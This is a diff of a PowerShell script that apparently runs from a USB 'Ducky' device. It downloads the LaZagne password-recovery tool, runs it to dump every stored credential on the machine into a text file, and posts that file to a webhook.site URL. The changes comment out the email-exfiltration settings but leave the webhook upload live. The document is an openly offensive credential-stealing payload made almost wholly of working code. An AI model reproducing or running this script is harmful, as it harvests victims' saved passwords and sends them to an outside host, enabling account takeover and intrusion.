@@ -95,16 +95,16 @@ Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download
 & "$dir\lazagne.exe" all > "$dir\output.txt"
 
 # Exfiltrate the file
-POST REQUEST
+#POST REQUEST
 Invoke-WebRequest -Uri "https://webhook.site/728c5b19-90fe-465b-b116-a4a5ae7b9e0c" -Method POST -Body Get-Content "$dir\output.txt"
 
 #Mail Exfiltration
-$smtp = "" # Put SMTP SERVER HERE, TESTED WITH GOOGLES
-$From = "" # Put the SENDER HERE
-$To = "" # Put the RECEIVER HERE
-$smtp = "" # PUT YOUR SMTP SERVER HERE (TESTED WITH GOOGLE)
-$Subject = "Ducky Rapport"
-$Body = "Hi, here is the Rapport"
+#$smtp = "" # Put SMTP SERVER HERE, TESTED WITH GOOGLES
+#$From = "" # Put the SENDER HERE
+#$To = "" # Put the RECEIVER HERE
+#$smtp = "" # PUT YOUR SMTP SERVER HERE (TESTED WITH GOOGLE)
+#$Subject = "Ducky Rapport"
+#$Body = "Hi, here is the Rapport"
 
 # The password is an app-specific password if you have 2-factor-auth enabled
 $Password = "" | ConvertTo-SecureString -AsPlainText -Force
